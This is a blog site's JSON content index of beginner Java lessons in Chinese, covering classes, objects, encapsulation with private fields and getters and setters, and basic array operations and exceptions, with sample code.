&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类方法中的boolean类型的get方法规则","slug":"java00037类方法中的boolean类型的get方法规则","date":"2020-02-11T22:48:52.000Z","updated":"2020-02-11T22:58:19.310Z","comments":true,"path":"2020/02/12/java00037类方法中的boolean类型的get方法规则/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/12/java00037类方法中的boolean类型的get方法规则/","excerpt":"","text":"类方法中的boolean类型的get方法规则 如果类中boolean类型的成员变量是private的,写get方法时的格式一定要是: 以is开头,后面紧跟着变量名,变量名首字符一定要大写 public boolean isXxxx() { return (boolean类型变量); } 如果是``boolean类型的成员变量是private,写set`方法时,按普通写法: public void setXxxx( boolean m_Xxxx) { Xxxx = m_Xxxx; } 1234567891011121314public class Main02&#123; public static void main(String[] args) &#123; Student student = new Student(); student.setName(\"小昭\"); //设置姓名 student.setAge(18);//设置年龄 student.setMale(false);//设置性别 System.out.println(student.getName());//获取姓名 System.out.println(student.getAge());//获取年龄 System.out.println(\"是否是男的: \" + student.isMale());//获取性别 &#125;&#125; 12345678910111213141516171819202122232425262728public class Student&#123; private String name;//学生姓名 private int age;//学生年龄 private boolean male;//学生性别,是否是男的 public String getName()&#123; return name; &#125; public int getAge()&#123; return age; &#125; public boolean isMale()&#123; return male; &#125; public void setName(String m_name)&#123; name = m_name; &#125; public void setAge(int m_age) &#123; age = m_age; &#125; public void setMale(boolean m_setMale) &#123; male = m_setMale; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"private关键字的作用及使用","slug":"java00036private关键字的作用及使用","date":"2020-02-11T10:51:53.000Z","updated":"2020-02-11T23:08:04.415Z","comments":true,"path":"2020/02/11/java00036private关键字的作用及使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00036private关键字的作用及使用/","excerpt":"","text":"private关键字的作用及使用 问题描述:定义Person的年龄时,无法阻止不合理的数值被赋值进来 解决方案:用private关键字将需要保护的成员变量进行修饰. private 数据类型 变量名 但是!超出了本类范围之外就不能再直接访问了. private成员变量的获取和设置方法规范格式: 获取:getXxxx开头,小驼峰式法,Xxxx代表私有的成员变量名 设置:setXxxx开头,小驼峰式法,Xxxx代表私有的成员变量名 public void setXxxx(int a) { ​ xxxx = a; } public int getXxxx() { return xxxx; } 1234567891011public class Main01&#123; public static void main(String[] args) &#123; Person person = new Person(); person.name = \"张无忌\"; person.setAge(18); person.setHeight(179); person.setSex(\"男\"); person.showPersonAll(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364package xiaochenyan.top.person;public class Person&#123; String name; private int age; //私有成员变量 private int height; //私有成员变量 private String sex; //私有成员变量 //用于设置age数据 public void setAge(int m_age) &#123; if(m_age &lt; 0) &#123; System.out.println(\"数据异常\"); return; &#125; age = m_age; &#125; //用于设置height数据 public void setHeight(int m_height) &#123; if(m_height &lt; 0) &#123; System.out.println(\"数据异常\"); return; &#125; height = m_height; &#125; //用于设置sex数据 public void setSex(String m_sex) &#123; sex = m_sex; &#125; //用于获取name数据 public String getName() &#123; return name; &#125; //用于获取sex数据 public String getSex() &#123; return sex; &#125; //用于获取age数据 public int getAge()&#123; return age; &#125; //用于获取height数据 public int getHeight() &#123; return height; &#125; //显示所有的成员变量 public void showPersonAll() &#123; System.out.println(name); System.out.println(age); System.out.println(height); System.out.println(sex); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象的三大特征","slug":"java00035面向对象的三大特征","date":"2020-02-11T10:23:40.000Z","updated":"2020-02-11T10:32:58.359Z","comments":true,"path":"2020/02/11/java00035面向对象的三大特征/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00035面向对象的三大特征/","excerpt":"","text":"面向对象的三大特征 面向对象的三大特征:封装,继承,多态 封装性在java当中体现: 1.方法就是一种封装 2.关键字private也是一种封装 封装就是将一些细节信息隐藏起来,对外界不可见. 12345678910public class Main4 &#123; public static void main(String[] args) &#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"黑色\"; one.printAll();//封装性,不用了解方法是怎么实现显示成员变量的,只需要知道怎么调用就行了. &#125;&#125; 12345678910111213public class Phone &#123; String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"局部变量和成员变量的区别","slug":"java00034局部变量和成员变量的区别","date":"2020-02-11T02:59:03.000Z","updated":"2020-02-11T03:15:47.154Z","comments":true,"path":"2020/02/11/java00034局部变量和成员变量的区别/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00034局部变量和成员变量的区别/","excerpt":"","text":"局部变量和成员变量的区别 1.定义的位置不一样 局部变量:在方法内部定义 成员变量:在方法外部定义,直接写在类当中 2.作用范围不一样 局部变量:只有方法当中才可以使用,出了方法就不能再用 成员变量:整个类全部都可以通用. 3.默认值不一样 局部变量:没有默认值,如果想使用,必须手动进行赋值 成员变量:如果没有赋值,会有默认值,规则和数组一样 4.内存的位置不一样 局部变量:位于栈内存 成员变量:位于堆区内存 5.生命周期不一样 局部变量:随着方法进栈而诞生,随着方法出栈而消失 成员变量:随着对象创建而诞生,随着对象被垃圾回收而消失 1234567891011public class Main3 &#123; public static void main(String[] args) &#123; Phone one = new Phone();//在堆区诞生 int a;//在栈区诞生 System.out.println(one.color);//默认值为null //System.out.println(a);//int a没有初始化,所以不能被使用. &#125;&#125; 123456789101112131415//类的定义public class Phone &#123; //成员变量在整个类作用域有效 String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用对象类型作为方法的返回值","slug":"java00033使用对象类型作为方法的返回值","date":"2020-02-11T02:10:46.000Z","updated":"2020-02-11T02:20:10.670Z","comments":true,"path":"2020/02/11/java00033使用对象类型作为方法的返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00033使用对象类型作为方法的返回值/","excerpt":"","text":"使用对象类型作为方法的返回值 当使用一个对象类型作为方法的返回值时:返回值其实就是对象的地址. 1234567891011121314151617public class Main2 &#123; public static void main(String[] args) &#123; Phone two = getPhone(); System.out.println(two.brand);//苹果 System.out.println(two.price);//8388.0 System.out.println(two.color);//玫瑰金 &#125; public static Phone getPhone()&#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"玫瑰金\"; return one; &#125;&#125; 1234567891011121314public class Phone &#123; String brand;//产品 double price;//价格 String color;//颜色 public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个对象指向同一个引用的内存图","slug":"java00031两个对象指向同一个引用的内存图","date":"2020-02-11T01:50:54.000Z","updated":"2020-02-11T01:56:52.138Z","comments":true,"path":"2020/02/11/java00031两个对象指向同一个引用的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00031两个对象指向同一个引用的内存图/","excerpt":"","text":"两个对象指向同一个引用的内存图 其中one对象和two对象都指向同一个堆 只要其中一个对象发生改变,另一个对象也会发生改变","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用对象类型作为方法的参数","slug":"java00032使用对象类型作为方法的参数","date":"2020-02-11T01:48:44.000Z","updated":"2020-02-11T02:12:25.873Z","comments":true,"path":"2020/02/11/java00032使用对象类型作为方法的参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/11/java00032使用对象类型作为方法的参数/","excerpt":"","text":"使用对象类型作为方法的参数 当一个对象作为参数,传递到方法当中时,实际上传进去的是对象的地址值 1234567891011121314151617public class Main &#123; public static void main(String[] args) &#123; Phone one = new Phone(); one.brand = \"苹果\"; one.price = 8388.0; one.color = \"黑色\"; method(one); &#125; public static void method(Phone param)&#123; System.out.println(param.brand);//苹果 System.out.println(param.price);//8388.0 System.out.println(param.color);//黑色 &#125;&#125; 123456789101112131415//类的定义public class Phone &#123; String brand; double price; String color; public void printAll() &#123; System.out.println(brand); System.out.println(price); System.out.println(color); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java两个对象使用同一个方的法内存","slug":"java00030两个对象使用同一个方法的内存","date":"2020-02-09T10:44:09.000Z","updated":"2020-02-09T11:03:45.735Z","comments":true,"path":"2020/02/09/java00030两个对象使用同一个方法的内存/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00030两个对象使用同一个方法的内存/","excerpt":"","text":"java两个对象使用同一个方的法内存 1.创建one对象时会创建一个堆,one指向堆地址 2.修改one.brand成员变量时,先从one找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;苹果&quot; 3.修改one.price成员变量时,先从one找到堆地址,接着再从堆中找到price变量,然后修改price的值为8388.0 4.修改one.color成员变量时,先从one找到堆地址,接着再从堆中找到color变量,然后修改color的值为黑色 5.调用one.call()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.call()方法,接着将one.call()方法压入栈. 1).初始化who参数的值为&quot;乔布斯&quot; 2).输出&quot;给xxx打电话&quot; 3).将one.call()方法退栈 4).返回到调用one.call()方法中的下一条语句 6.调用one.sendMessage()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.sendMessage()方法,接着将one.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将one.sendMessage()方法退栈 3).返回到调用one.sendMessage()方法中的下一条语句 7.创建two对象时会创建一个堆,two指向堆地址 8.修改two.brand成员变量时,先从two找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;三星&quot; 9.修改two.price成员变量时,先从two找到堆地址,接着再从堆中找到price变量,然后修改price的值为5999.0 10.修改two.color成员变量时,先从two找到堆地址,接着再从堆中找到color变量,然后修改color的值为蓝色 11.调用two.call()方法,先从two找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到two.call()方法,接着将two.call()方法压入栈. 1).初始化who参数的值为&quot;欧巴&quot; 2).输出&quot;给欧巴打电话&quot; 3).将two.call()方法退栈 4).返回到调用two.call()方法中的下一条语句 12.调用two.sendMessage()方法,先从two找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到two.sendMessage()方法,接着将two.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将two.sendMessage()方法退栈 3).返回到调用two.sendMessage()方法中的下一条语句 13.main方法结束,将main方法退栈; one对象方法和two对象方法是指向同一个方法内存的","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"一个对象的内存图","slug":"java00029一个对象的内存图","date":"2020-02-09T07:40:56.000Z","updated":"2020-02-09T10:51:42.281Z","comments":true,"path":"2020/02/09/java00029一个对象的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00029一个对象的内存图/","excerpt":"","text":"一个对象的内存图 1.创建one对象时会创建一个堆,one指向堆地址 2.修改one.brand成员变量时,先从one找到堆地址,接着再从堆中找到brand变量,然后修改brand的值为&quot;苹果&quot; 3.修改one.price成员变量时,先从one找到堆地址,接着再从堆中找到price变量,然后修改price的值为8388.0 4.修改one.color成员变量时,先从one找到堆地址,接着再从堆中找到color变量,然后修改color的值为黑色 5.调用one.call()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.call()方法,接着将one.call()方法压入栈. 1).初始化who参数的值为&quot;乔布斯&quot; 2).输出&quot;给xxx打电话&quot; 3).将one.call()方法退栈 4).返回到调用one.call()方法中的下一条语句 6.调用one.sendMessage()方法,先从one找到堆地址,接着从堆中找到成员方法所在方法区中的地址,然后在从方法区中找到one.sendMessage()方法,接着将one.sendMessage()方法压入栈. 1).输出&quot;群发短信&quot; 2).将one.sendMessage()方法退栈 3).返回到调用one.sendMessage()方法中的下一条语句 7.main方法结束,将main方法退栈;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类的定义","slug":"java00027类的定义","date":"2020-02-09T06:37:24.000Z","updated":"2020-02-09T06:44:49.507Z","comments":true,"path":"2020/02/09/java00027类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00027类的定义/","excerpt":"","text":"类的定义 定义一个类,有两个组成部分: 成员属性: 事物的状态信息. 成员行为: 事物的行为. 注意事项: 1.成员变量是直接定义在类当中的,在方法外面. 2.成员方法不要写static关键字. 1234567891011121314151617181920212223242526272829303132333435363738394041424344package xiaochenyan.top.banji;/*定义一个类,用模拟\"学生\"事物.其中有两个组成部分:属性(是什么): 姓名 年龄行为(能做什么): 吃饭 睡觉 学习对应到Java的类当中:成员变量(属性): String name; int age;成员方法(行为): public void eat()&#123;&#125;; //吃饭 public void sleep()&#123;&#125;; //睡觉 public void study()&#123;&#125;; //学习*/public class Student01 &#123; //属性(成员变量) String name; int age; //行为(成员方法) public void eat()&#123; System.out.println(\"吃饭饭\"); &#125; public void sleep()&#123; System.out.println(\"睡觉觉\"); &#125; public void study()&#123; System.out.println(\"学习!\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"对象的创建及其使用","slug":"java00028x对象的创建及其使用","date":"2020-02-09T06:37:24.000Z","updated":"2023-09-24T18:14:52.942Z","comments":true,"path":"2020/02/09/java00028x对象的创建及其使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00028x对象的创建及其使用/","excerpt":"","text":"对象的创建及其使用 1.导包: 也就是指出需要使用的类,在什么位置. 12import 包名称.类名称;import xiaochenyan.top.banji; 对于和当前类属于同一个包的情况,可以省略导包语句不写. 2.创建,格式 12类名称 对象名 = new 类名称();Student01 std = new Student01(); 3.使用,分为两种情况 使用成员变量,对象名.成员变量 使用成员方法,对象名.成员方法名(参数) (也就是,想用谁,就用对象名点谁) 123456789101112131415161718192021222324252627282930313233343536373839404142434445package xiaochenyan.top.banji;//导包格式import xiaochenyan.top.banji.Student01;/*1.导包: 也就是指出需要使用的类,在什么位置.import 包名称.类名称;import xiaochenyan.top.banji;对于和当前类属于同一个包的情况,可以省略导包语句不写.2.创建,格式类名称 对象名 = new 类名称();Student01 std = new Student01();3.使用,分为两种情况使用成员变量,对象名.成员变量使用成员方法,对象名.成员方法名(参数)(也就是,想用谁,就用对象名点谁) */public class test001 &#123; public static void main(String[] args) &#123; //创建对象格式 Student01 std = new Student01(); //使用成员变量格式 System.out.println(std.age); System.out.println(std.name); //使用成员方法格式 std.eat(); std.sleep(); std.study(); System.out.println(\"===========================\"); std.name = \"金毛狮王\"; std.age = 52; //使用成员变量格式 System.out.println(std.age); System.out.println(std.name); //使用成员方法格式 std.eat(); std.sleep(); std.study(); System.out.println(\"===========================\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类的定义","slug":"java00026类的定义","date":"2020-02-09T05:52:12.000Z","updated":"2020-02-09T06:04:59.484Z","comments":true,"path":"2020/02/09/java00026类的定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00026类的定义/","excerpt":"","text":"类的定义 事物与类的对比 现实世界的一类事物: 属性: 事物的状态信息 行为: 事物能够做什么 java中用class描述事物也是如此: 成员变量: 对应事物的属性 成员方法: 对应事物的行为 类的定义格式 1234public class ClassName&#123; //成员变量 //成员方法&#125; 定义类: 就是定义类的成员,包括成员变量和成员方法. 成员变量: 和以前定义变量几乎一样的,只不过位置发生了改变.在类中,在方法外. 成员方法: 和以前定义方法几乎是一样的.只不过把static去掉.","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类和对象的关系","slug":"java00025类和对象的关系","date":"2020-02-09T05:47:30.000Z","updated":"2020-02-09T05:50:15.205Z","comments":true,"path":"2020/02/09/java00025类和对象的关系/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00025类和对象的关系/","excerpt":"","text":"类和对象","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象思想的举例","slug":"java00024面向对象思想的举例","date":"2020-02-09T05:44:02.000Z","updated":"2020-02-09T05:46:38.927Z","comments":true,"path":"2020/02/09/java00024面向对象思想的举例/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00024面向对象思想的举例/","excerpt":"","text":"举例","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"面向对象思想的概述","slug":"java00023面向对象思想的概述","date":"2020-02-09T05:29:23.000Z","updated":"2020-02-09T05:41:57.338Z","comments":true,"path":"2020/02/09/java00023面向对象思想的概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/09/java00023面向对象思想的概述/","excerpt":"","text":"面向过程: 当需要实现一个功能的时候,每一个具体的步骤都要亲力亲为,详细处理每一个细节. 面向对象: 当需要实现一个功能的时候,不关心具体的步骤,而是找一个已经具有该功能的人,来帮我做事儿. 12345678910111213141516171819202122232425262728package xiaochenyan.top.banji;import java.util.Arrays;public class Student &#123; public static void main(String[] args) &#123; int[] array = &#123;1,23,4,15,51,2,52,23&#125;; //要求打印格式为[123,,123,41,123,] //使用面向过程,每一个步骤细节都要亲力亲为 System.out.print(\"[\"); for(int i = 0;i &lt; array.length;i++) &#123; if(i == array.length - 1) &#123; System.out.println(array[i] + \"]\"); &#125;else&#123; System.out.print(array[i] + \", \"); &#125; &#125; System.out.println(\"======================\"); //使用面向对象 //找一个JDK给我们提供好的Arrays类 //其中有一个toString方法,直接就能把数组变成想要的格式字符串 System.out.println(Arrays.toString(array)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组作为方法的返回值返回","slug":"java00022数组作为方法返回值返回","date":"2020-02-08T10:20:21.000Z","updated":"2020-02-09T04:59:23.096Z","comments":true,"path":"2020/02/08/java00022数组作为方法返回值返回/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00022数组作为方法返回值返回/","excerpt":"","text":"一个方法可以有1个或多个参数;但是只能有0个或1个返回值,不能有个多返回值. 如果希望一个方法当中产生了多个结果数据进行返回 , 怎么办 ? 解决方案:使用一个数组作为返回值类型即可. 任何数据类型都能作为方法的参数类型,或者返回值类型. 数组作为方法的参数,传递进去的其实是数组的地址值 数组作为方法的返回值,返回的其实是数组的地址值 1234567891011121314151617181920public class test020 &#123; public static void main(String[] args) &#123; int[] array = sumAndPingJunShu(1,2,3); for (int i : array) &#123; System.out.println(i); &#125; &#125; public static int[] sumAndPingJunShu(int a,int b,int c) &#123; int sum = a + b + c; int pjs = (a + b + c) / 3; int cj = a * b * c; int[] array = &#123;sum,pjs,cj&#125;; return array; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组作为方法参数","slug":"java00021数组作为方法参数","date":"2020-02-08T10:12:58.000Z","updated":"2020-02-08T10:17:30.536Z","comments":true,"path":"2020/02/08/java00021数组作为方法参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00021数组作为方法参数/","excerpt":"","text":"数组可以作为方法的参数 当调用方法的时候,向方法的小括号进行传参,传递进去的其实是数组的地址值. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package xiaochenyan.top;public class test019 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,234,12,4,124,21,315,15,1235,461,235,1,34632,135,124151,32515,612,351,35&#125;; arraySort(array); // 把数组地址值传递给形参 arrayOut(array); // 把数组地址值传递给形参 funFZ(array); // 把数组地址值传递给形参 arrayOut(array); // 把数组地址值传递给形参 &#125; //冒泡法排序 public static void arraySort(int[] array) &#123; for(int i = 0;i &lt; array.length - 1;i++) &#123; for(int j = 0;j &lt; array.length - (i + 1);j++) &#123; if(array[j] &lt; array[j + 1] ) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125; &#125; //数组遍历输出 public static void arrayOut(int[] array) &#123; for (int i : array) &#123; System.out.print(i + \" \" ); &#125; System.out.println(\"\"); System.out.println(\"===================================\"); &#125; //数组反转 public static void funFZ(int[] array) &#123; int max = array.length - 1; int min = 0; for(;min &lt; max;min++,max--) &#123; int temp = array[min]; array[min] = array[max]; array[max] = temp; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"获取数组的最大值","slug":"java00019获取数组的最大值","date":"2020-02-08T07:37:28.000Z","updated":"2020-02-08T09:32:21.502Z","comments":true,"path":"2020/02/08/java00019获取数组的最大值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00019获取数组的最大值/","excerpt":"","text":"12345678910111213141516public class test018 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,2,21,41,1235,21,12,52,2351,234,12,234,23,123412,12&#125;; int max = array[0]; for (int i = 1;i &lt; array.length;i++) &#123; if(max &lt; array[i]) // 如果max 小于 array[i],那么将array[i]的值,赋值给max &#123; max = array[i]; &#125; &#125; System.out.println(\"array数组的最大值:\" + max); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组的遍历输出","slug":"java00020数组的遍历输出","date":"2020-02-08T07:25:09.000Z","updated":"2020-02-08T09:32:08.533Z","comments":true,"path":"2020/02/08/java00020数组的遍历输出/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00020数组的遍历输出/","excerpt":"","text":"遍历数组,说的就是对数组当中的每一个元素进行逐一处理.默认的处理方式就是打印输出. 123456789101112131415161718public class test017 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,2,324,12,234,15,12,51,234,21&#125;; //第一种方法,将array的每一个元素逐次赋值给i for (int i : array) &#123; System.out.println(i); &#125; System.out.println(\"======================\"); //第二种方法,将i当做array的下标,通过i的不断增加,来打印array数组,且i小于array.length for (int i = 0; i &lt; array.length;i++) &#123; System.out.println(array[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组元素反转","slug":"java00018数组元素反转","date":"2020-02-08T07:13:31.000Z","updated":"2020-02-08T09:09:01.983Z","comments":true,"path":"2020/02/08/java00018数组元素反转/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00018数组元素反转/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class test019 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,234,12,4,124,21,315,15,1235,461,235,1,34632,135,124151,32515,612,351,35&#125;; //数组排序 arraySort(array); //数组遍历输出 arrayOut(array); //数组反转 funFZ(array); //数组遍历输出 arrayOut(array); &#125; //冒泡法排序 public static void arraySort(int[] array) &#123; for(int i = 0;i &lt; array.length - 1;i++) &#123; for(int j = 0;j &lt; array.length - (i + 1);j++) &#123; if(array[j] &lt; array[j + 1] ) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125; &#125; //数组遍历输出 public static void arrayOut(int[] array) &#123; for (int i : array) &#123; System.out.print(i + \" \" ); &#125; System.out.println(\"\"); System.out.println(\"===================================\"); &#125; //数组反转 public static void funFZ(int[] array) &#123; int max = array.length - 1; int min = 0; for(;min &lt; max;min++,max--) &#123; int temp = array[min]; array[min] = array[max]; array[max] = temp; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"获取数组长度","slug":"java00017获取数组长度","date":"2020-02-08T07:13:31.000Z","updated":"2020-02-08T07:16:52.078Z","comments":true,"path":"2020/02/08/java00017获取数组长度/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00017获取数组长度/","excerpt":"","text":"如何获取数组的长度,格式: 数组名称.length 这将会得到一个int数字,代表数组的长度. 数组一旦创建,程序运行期间,长度不可发生改变. 123456789101112131415161718192021/*如何获取数组的长度,格式:数组名称.length这将会得到一个int数字,代表数组的长度.数组一旦创建,程序运行期间,长度不可发生改变. */public class test016 &#123; public static void main(String[] args) &#123; int[] arrayA = &#123;12,12,324,5,15,12,535,13&#125;; //获取数组arrayA的长度 System.out.println(\"arrayA数组的长度:\" + arrayA.length); int[] arrayB = new int[3]; //获取数组arrayB的长度 System.out.println(\"arrayB数组的长度:\" + arrayB.length); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"常见问题 空指针异常","slug":"java00016常见问题-空指针异常","date":"2020-02-08T06:59:12.000Z","updated":"2020-02-08T07:06:45.688Z","comments":true,"path":"2020/02/08/java00016常见问题-空指针异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00016常见问题-空指针异常/","excerpt":"","text":"所有的引用类型变量,都可以赋值为一个null值.但是代表其中什么都没有. 数组必须进行new初始化才能使用其中的元素 如果只是赋值了一个null,没有进行new创建, 那么将会发生: 空指针异常 NullPointerException 原因:忘了补new 解决:补上new 1234567891011121314151617181920public class test015 &#123; /* 所有的引用类型变量,都可以赋值为一个null值.但是代表其中什么都没有. 数组必须进行new初始化才能使用其中的元素 如果只是赋值了一个null,没有进行new创建, 那么将会发生: 空指针异常 NullPointerException 原因:忘了补new 解决:补上new */ public static void main(String[] args) &#123; int[] array = null; //array = new int[3]; System.out.println(array[0]);//空指针异常 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组索引越界异常","slug":"java00015数组索引越界异常","date":"2020-02-08T06:46:01.000Z","updated":"2023-09-25T15:44:48.104Z","comments":true,"path":"2020/02/08/java00015数组索引越界异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00015数组索引越界异常/","excerpt":"","text":"数组索引从0开始,一直到数组长度-1为止. 如果访问数组元素的时候,索引编号并不存在,那么将会发生数组索引越界异常 提示:ArrayIndexOutOfBoundsException 原因: 索引编号写错了 解决: 修改成为存在的正确索引编号. 蓝色字体中的15代表15行有错误。 1234567891011121314151617181920212223package xiaochenyan.top;public class test014 &#123; /* 数组索引从0开始,一直到数组长度-1为止. 如果访问数组元素的时候,索引编号并不存在,那么将会发生数组索引越界异常 ArrayIndexOutOfBoundsException 原因: 索引编号写错了 解决: 修改成为存在的正确索引编号. */ public static void main(String[] args) &#123; int[] array = new int[4]; array[0] = 1; array[1] = 2; array[2] = 3; array[3] = 4; // 数组越界,发生异常,导致错误 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个引用指向同一个数组","slug":"java00014两个引用指向同一个数组","date":"2020-02-07T20:05:38.000Z","updated":"2020-02-07T20:08:12.994Z","comments":true,"path":"2020/02/08/java00014两个引用指向同一个数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00014两个引用指向同一个数组/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132package xiaochenyan.top;public class test013 &#123; public static void main(String[] args) &#123; int[] arrayA = new int[3]; System.out.println(arrayA); System.out.println(arrayA[0]); System.out.println(arrayA[1]); System.out.println(arrayA[2]); System.out.println(&quot;====================&quot;); arrayA[1] = 10; arrayA[2] = 20; System.out.println(arrayA); System.out.println(arrayA[0]); System.out.println(arrayA[1]); System.out.println(arrayA[2]); System.out.println(&quot;====================&quot;); int[] arrayB = arrayA; System.out.println(arrayB); System.out.println(arrayB[0]); System.out.println(arrayB[1]); System.out.println(arrayB[2]); System.out.println(&quot;====================&quot;); arrayB[1] = 10; arrayB[2] = 20; System.out.println(arrayB); System.out.println(arrayB[0]); System.out.println(arrayB[1]); System.out.println(arrayB[2]); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个数组的内存图","slug":"java00013两个数组的内存图","date":"2020-02-07T19:28:56.000Z","updated":"2020-02-07T19:35:14.584Z","comments":true,"path":"2020/02/08/java00013两个数组的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00013两个数组的内存图/","excerpt":"","text":"1234567891011121314package xiaochenyan.top;public class test012 &#123; public static void main(String[] args) &#123; int[] array1 = new int[3]; //创建一个包含三个元素的array1数组 System.out.println(array1); //打印array1的地址 array1[1] = 2; //修改array1[1]的值 array1[2] = 100; //修改array1[2]的值 int[] array2 = new int[3]; //创建一个包含三个元素的array2数组 System.out.println(array2); //打印array2的地址 array2[1] = 300; //修改array2[1]的值 array2[2] = 25; //修改array2[2]的值 